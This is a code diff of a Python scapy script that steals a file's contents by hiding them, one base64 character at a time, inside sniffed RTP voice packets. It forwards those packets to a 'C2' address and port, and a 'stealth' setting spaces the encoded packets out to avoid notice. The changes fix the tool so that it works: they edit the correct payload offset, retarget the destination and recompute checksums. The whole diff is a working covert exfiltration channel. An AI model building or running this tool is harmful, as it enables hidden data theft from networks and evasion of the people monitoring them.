@@ -3,25 +3,30 @@ import base64
 import queue
 import time
 import scapy.all as scapy
-from scapy.all import sendp, sendpfast
+from scapy.all import sendp
 from scapy.layers.inet import UDP
 from scapy.layers.inet import IP
 from scapy.packet import Raw
 from scapy.packet import ls
 from scapy.all import bytes_hex
+from scapy.layers.inet import Packet
 
 
 def encodePacket(packet, character):
-    return packet[:66] + bytes(character, encoding="raw_unicode_escape") + packet[67:]
+    rawData = packet[Raw].load
+    packet[Raw].load = rawData[:12] + bytes(character, encoding="raw_unicode_escape") + rawData[13:]
+    return packet
 
 
 def changeIPAndPort(packet, address, port):
-    packet[IP].src = address
-    packet[UDP].port = port
+    packet[IP].dst = address
+    packet[UDP].dport = port
     return packet
 
 
 def sendPacket(packet):
+    del packet[UDP].chksum
+    del packet[IP].chksum
     sendp(packet)
 
 
@@ -32,13 +37,15 @@ if __name__ == '__main__':
     parser.add_argument("-s", "--stealth", help="Number of packet encodings between each RTP transmission")
     parser.add_argument("-d", "--destination_address", help="The destination ipv4 address we send encoded RTP traffic")
     parser.add_argument("-c", "--C2_listening_port", help="The port we forward encoded RTP traffic ro")
-    parser.add_argument("-l", "--server_listening_port", help="The port we receive RTP traffic from on the VoIP server")
+    parser.add_argument("-i", "--host_ip", help="The ipv4 address of a host in the RTP session")
     args = parser.parse_args()
 
-    stealthVal = args.stealth
+    stealthVal = int(args.stealth)
     destinationAddress = args.destination_address
-    listeningPort = args.C2_listening_port
+    listeningPort = int(args.C2_listening_port)
+    hostIP = args.host_ip
 
+    print(args) # Debugging
     if args.filename is not None:
         file = open(args.filename, 'rb')
         transmissionString = base64.b64encode(file.read())
@@ -48,7 +55,7 @@ if __name__ == '__main__':
 
     packetQ = queue.Queue()
 
-    asyncSniffer = scapy.AsyncSniffer(filter=f"dst port {19610}", prn=lambda x: packetQ.put(x))
+    asyncSniffer = scapy.AsyncSniffer(filter=f"dst host {hostIP}", prn=lambda x: packetQ.put(x))
     asyncSniffer.start()
 
     encodedPackets = 0
@@ -58,9 +65,10 @@ if __name__ == '__main__':
         if packetQ.qsize() > 0:
             pkt = packetQ.get()
             if sentPackets == 0:
-                sendPacket(changeIPAndPort(encodePacket(pkt, transmissionString[encodedPackets]), destinationAddress, listeningPort))
+                sendPacket(encodePacket(changeIPAndPort(pkt, destinationAddress, listeningPort), transmissionString[encodedPackets]))
                 encodedPackets += 1
+            else:
+                sendPacket(changeIPAndPort(pkt, destinationAddress, listeningPort))
             sentPackets = (1 + sentPackets) % stealthVal
 
     asyncSniffer.stop()
-
